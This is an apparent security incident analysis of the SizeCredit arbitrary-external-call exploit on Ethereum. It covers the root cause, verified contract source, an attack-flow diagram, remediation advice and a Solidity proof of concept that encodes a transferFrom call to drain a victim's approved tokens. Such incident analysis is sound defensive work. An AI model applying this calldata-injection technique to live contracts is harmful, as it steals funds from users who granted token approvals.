# SizeCredit — Arbitrary External Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-07 |
| **Protocol** | SizeCredit |
| **Chain** | Ethereum |
| **Loss** | ~19,700 USD |
| **Attacker** | [0xa7e9b982b0e19a399bc737ca5346ef0ef12046da](https://etherscan.io/address/0xa7e9b982b0e19a399bc737ca5346ef0ef12046da) |
| **Attack Tx** | [0xc7477d6a...](https://etherscan.io/tx/0xc7477d6a5c63b04d37a39038a28b4cbaa06beb167e390d55ad4a421dbe4067f8) |
| **Vulnerable Contract** | [0xf4a21ac7e51d17a0e1c8b59f7a98bb7a97806f14](https://etherscan.io/address/0xf4a21ac7e51d17a0e1c8b59f7a98bb7a97806f14) |
| **Root Cause** | The `leverageUpWithSwap` function passes supplied calldata to an external contract for execution without any validation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/SizeCredit_exp.sol) |

---

## 1. Vulnerability Overview

SizeCredit's `leverageUpWithSwap` function passes swap calldata to an external contract for execution in order to increase a leverage position. However, because this calldata is not validated in any way, an attacker could inject arbitrary malicious calldata to drain tokens that victim addresses had previously approved. This resulted in approximately 19,700 USD worth of PT-wstUSR tokens being stolen.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: external call executed without calldata validation
function leverageUpWithSwap(
    address swapTarget,
    bytes calldata swapData,  // ← attacker can inject arbitrary data
    ...
) external {
    // swapData contents are executed without any validation
    (bool success,) = swapTarget.call(swapData);
    require(success, "swap failed");
}

// ✅ Remediation: only execute allowed swap targets and function selectors
function leverageUpWithSwap(
    address swapTarget,
    bytes calldata swapData,
    ...
) external {
    require(allowedSwapTargets[swapTarget], "target not allowed");
    require(isAllowedSelector(swapData[:4]), "selector not allowed");
    (bool success,) = swapTarget.call(swapData);
    require(success, "swap failed");
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: src/liquidator/DexSwap.sol
function _swap(SwapParams[] memory swapParamsArray) internal {
        for (uint256 i = 0; i < swapParamsArray.length; i++) {
            _executeSwapStep(swapParamsArray[i]);
        }
    }
    function _executeSwapStep(SwapParams memory swapParams) internal {
        if (swapParams.method == SwapMethod.GenericRoute) {
            _swapGenericRoute(swapParams.data);
        } else if (swapParams.method == SwapMethod.OneInch) {
            _swap1Inch(swapParams.data);
        } else if (swapParams.method == SwapMethod.Unoswap) {
            _swapUnoswap(swapParams.data);
        } else if (swapParams.method == SwapMethod.UniswapV2) {
            _swapUniswapV2(swapParams.data);
        } else if (swapParams.method == SwapMethod.UniswapV3) {
            _swapUniswapV3(swapParams.data);
        } else if (swapParams.method == SwapMethod.BoringPtSeller) {
            _executePtSellerStep(swapParams.data);
        } else if (swapParams.method == SwapMethod.BuyPt) {
            _executeBuyPtStep(swapParams.data);
        } else {
            revert PeripheryErrors.INVALID_SWAP_METHOD();
        }
    }
    function _executePtSellerStep(bytes memory data) internal {
        BoringPtSellerParams memory params = abi.decode(data, (BoringPtSellerParams));
        address tokenOut = getPtSellerTokenOut(params.market, params.tokenOutIsYieldToken);
        _sellPtForToken(params.market, IERC20(params.pt).balanceOf(address(this)), tokenOut);
    }
    function _executeBuyPtStep(bytes memory data) internal {
        BuyPtParams memory params = abi.decode(data, (BuyPtParams));

        uint256 amountIn = IERC20(params.tokenIn).balanceOf(address(this));

        IERC20(params.tokenIn).forceApprove(params.router, amountIn);

        IPAllActionV3(params.router).swapExactTokenForPt(
            address(this),
            address(params.market),
            params.minPtOut,
            createDefaultApproxParams(),
            createTokenInputSimple(params.tokenIn, amountIn),
            createEmptyLimitOrderData()
        );
    }
    function _swap1Inch(bytes memory data) internal {
        OneInchParams memory params = abi.decode(data, (OneInchParams));
        IERC20(params.fromToken).forceApprove(address(oneInchAggregator), type(uint256).max);
        oneInchAggregator.swap(
            params.fromToken,
            params.toToken,
            IERC20(params.fromToken).balanceOf(address(this)),
            params.minReturn,
            params.data
        );
    }
    function _swapUniswapV2(bytes memory data) internal {
        UniswapV2Params memory params = abi.decode(data, (UniswapV2Params));
        IERC20(params.path[0]).forceApprove(address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.swapExactTokensForTokens(
            params.amountIn, params.amountOutMin, params.path, params.to, params.deadline
        );
    }
    function _swapUnoswap(bytes memory data) internal {
        UnoswapParams memory params = abi.decode(data, (UnoswapParams));
        IERC20(params.srcToken).forceApprove(address(unoswapRouter), type(uint256).max);
        unoswapRouter.unoswapTo(address(this), params.srcToken, params.amount, params.minReturn, params.pool);
    }
    function _swapUniswapV3(bytes memory data) internal {
        UniswapV3Params memory params = abi.decode(data, (UniswapV3Params));
        uint256 amountIn = IERC20(params.tokenIn).balanceOf(address(this));
        IERC20(params.tokenIn).forceApprove(address(uniswapV3Router), amountIn);

        IUniswapV3Router.ExactInputSingleParams memory swapParams = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: params.tokenIn,
            tokenOut: params.tokenOut,
            fee: params.fee,
            recipient: address(this),
            amountIn: amountIn,
            amountOutMinimum: params.amountOutMinimum,
            sqrtPriceLimitX96: params.sqrtPriceLimitX96
        });

        uniswapV3Router.exactInputSingle(swapParams);
    }
    function _swapGenericRoute(bytes memory data) internal {
        GenericRouteParams memory params = abi.decode(data, (GenericRouteParams));

        // Approve router to spend collateral token
        IERC20(params.tokenIn).forceApprove(params.router, type(uint256).max);

        // Execute swap via low-level call
        (bool success,) = params.router.call(params.data);
        if (!success) {
            revert PeripheryErrors.GENERIC_SWAP_ROUTE_FAILED();
        }
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Confirm victim's PT-wstUSR approval to LEVERAGE_UP contract
  │         └─ Check allowance: victim → LEVERAGE_UP
  │
  ├─[2]─▶ Call leverageUpWithSwap
  │         └─ swapData = encode transferFrom(victim, attacker, amount)
  │
  ├─[3]─▶ LEVERAGE_UP executes malicious calldata against PT-wstUSR contract
  │         └─ transferFrom(victim, attacker, fullBalance) succeeds
  │
  └─[4]─▶ Theft complete
              └─ Receive ~19,700 USD worth of PT-wstUSR
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public balanceLog {
    IERC20 wstUSR = IERC20(PT_WSTUSR);

    // [1] Check victim's balance and allowance
    uint256 bal = wstUSR.balanceOf(VICTIM);
    uint256 allowance = wstUSR.allowance(VICTIM, LEVERAGE_UP);
    uint256 amount = bal;

    // [2] Construct malicious calldata:
    // Call transferFrom on PT_WSTUSR contract directing funds from victim → attacker
    bytes memory maliciousData = abi.encodeWithSignature(
        "transferFrom(address,address,uint256)",
        VICTIM,           // from: victim
        address(this),    // to: attacker
        amount            // amount: victim's full balance
    );

    // [3] Call leverageUpWithSwap on LEVERAGE_UP passing the malicious data
    // Internally executes PT_WSTUSR.call(maliciousData) → transferFrom succeeds
    ILeverageUp(LEVERAGE_UP).leverageUpWithSwap(
        PT_WSTUSR,     // swapTarget = token contract address
        maliciousData, // swapData = malicious transferFrom call
        ...
    );
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call |
| **Attack Vector** | Unvalidated calldata execution |
| **Impact** | Theft of approved tokens |
| **CWE** | CWE-284: Improper Access Control |
| **DASP Classification** | Access Control / Arbitrary Call |

## 6. Remediation Recommendations

1. **Apply an Allowlist**: Restrict `swapTarget` to addresses registered on a whitelist only.
2. **Validate Function Selectors**: Restrict the first 4 bytes (function selector) of `swapData` to an approved set of values only.
3. **Prohibit Token Contract Calls**: Enforce that `swapTarget` is never the same as the token addresses being handled.
4. **Adopt Audit Patterns**: Add check logic that validates balance changes before and after callbacks/external calls.

## 7. Lessons Learned

- **Contracts that leverage user approvals** are prime targets for arbitrary calldata execution exploits.
- Passing external calldata through to execution without validation is equivalent to delegating the contract's own permissions to the attacker.
- When integrating swap functionality, target addresses and function selectors must always be managed via a whitelist.